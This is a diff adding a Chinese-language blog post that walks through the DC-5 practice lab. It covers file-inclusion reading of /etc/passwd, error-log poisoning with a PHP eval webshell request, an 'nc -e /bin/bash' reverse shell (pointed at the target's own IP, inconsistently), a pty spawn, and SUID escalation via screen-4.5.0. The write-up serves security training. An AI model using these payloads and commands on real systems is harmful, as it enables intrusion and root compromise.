@@ -1,5 +1,12 @@
-// 帖子按日期倒序显示。可使用 posts/editor.html 编辑并导出此文件。
 window.BLOG_POSTS = [
+  {
+    "id": "dc5-walkthrough",
+    "title": "DC5——万不言 文件包含 脚本提权",
+    "date": "2026-11-26",
+    "category": "靶场记录",
+    "excerpt": "DC-5 实验记录：文件包含、错误日志利用、交互式 Shell 与脚本提权，附 12 张原始截图和 Word 文档。",
+    "content": "DC-5 靶场实验记录，包含主机扫描、文件包含、错误日志利用、交互式 Shell 和脚本提权。\n\n## 主机发现与端口扫描\n\n```sh\nnmap -sP 192.168.139.0/24\n```\n\n靶机 IP：`192.168.139.137`。\n\nKali IP：`192.168.139.129`。\n\n![主机发现与端口扫描，原文截图 1](posts/images/dc5/screenshot-01.png)\n\n扫描靶机 IP。\n\n获取开放端口：\n\n```sh\nnmap -A -p- 192.168.139.137\n```\n\n![主机发现与端口扫描，原文截图 2](posts/images/dc5/screenshot-02.png)\n\n扫描发现端口 `80`、`111` 和 `48406`。\n\n## HTTP 页面与文件包含\n\n在浏览器中打开 80 端口。\n\n页面中只有一个提交表单。\n\n检查文件包含漏洞。\n\n发现刷新 `thankyou.php` 页面会更新底部年份。\n\n![HTTP 页面与文件包含，原文截图 3](posts/images/dc5/screenshot-03.png)\n\n据此推测底部年份由一个被包含的文件控制。\n\n既然页面包含文件，尝试抓包更改文件位置，查看其他文件。\n\n访问 `thankyou.php?file=?`。\n\n文件位置留空时，底部年份消失。\n\n![HTTP 页面与文件包含，原文截图 4](posts/images/dc5/screenshot-04.png)\n\n## 读取本地文件\n\n抓包修改被包含文件的位置。\n\n将 `Footer.php` 改为 `/etc/passwd`。\n\n![读取本地文件，原文截图 5](posts/images/dc5/screenshot-05.png)\n\n发包后，在原本显示底部年份的位置看到包含文件的内容。\n\n确认可以读取文件。\n\n![读取本地文件，原文截图 6](posts/images/dc5/screenshot-06.png)\n\n## 错误日志与命令执行\n\n接下来写入一句话木马。\n\n写入后触发报错，相关代码会进入错误日志。\n\n原文中的请求内容如下：\n\n```http\nGET /thankyou.php?file=<?php eval($_REQUEST[\"tedu\"]);?>\n```\n\n![错误日志与命令执行，原文截图 7](posts/images/dc5/screenshot-07.png)\n\n原文记录该请求将一句话木马写入了错误日志。\n\nNginx 错误日志默认路径为 `/var/log/nginx/error.log`。\n\n## 连接终端与交互式 Shell\n\n使用蚁剑连接。\n\n在 Kali 上监听 `1234` 端口：\n\n```sh\nnc -lvp 1234\n```\n\n在蚁剑终端中发送原文的 Shell 连接命令：\n\n```sh\nnc -e /bin/bash 192.168.139.137 1234\n```\n\n在 Kali 端生成交互式 Shell：\n\n```sh\npython -c 'import pty;pty.spawn(\"/bin/bash\")'\n```\n\n## SUID 检查与提权\n\n发现没有 sudo 权限。\n\n尝试 SUID 提权。\n\n查找具有 SUID 权限的文件：\n\n```sh\nfind / -perm -u=s -type f 2>/dev/null\n```\n\n![SUID 检查与提权，原文截图 8](posts/images/dc5/screenshot-08.png)\n\n使用检测到的 `screen-4.5.0`。\n\n使用 SearchSploit 查找对应的提权脚本。\n\n## 上传并运行脚本\n\n通过蚁剑将脚本上传到靶机。\n\n![上传并运行脚本，原文截图 9](posts/images/dc5/screenshot-09.png)\n\n修改文件的运行权限。\n\n运行脚本文件。\n\n![上传并运行脚本，原文截图 10](posts/images/dc5/screenshot-10.png)\n\n## 提权结果\n\n原文记录提权成功。\n\n![提权结果，原文截图 11](posts/images/dc5/screenshot-11.png)\n\n结束。\n\n![提权结果，原文截图 12](posts/images/dc5/screenshot-12.png)\n\n## 原始文档\n\n[下载 DC5 Word 原件](资料/DC5%E2%80%94%E2%80%94%E4%B8%87%E4%B8%8D%E8%A8%80%20%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%20%20%E8%84%9A%E6%9C%AC%E6%8F%90%E6%9D%83.docx)"
+  },
   {
     "id": "dc4-walkthrough",
     "title": "DC4——万不言",
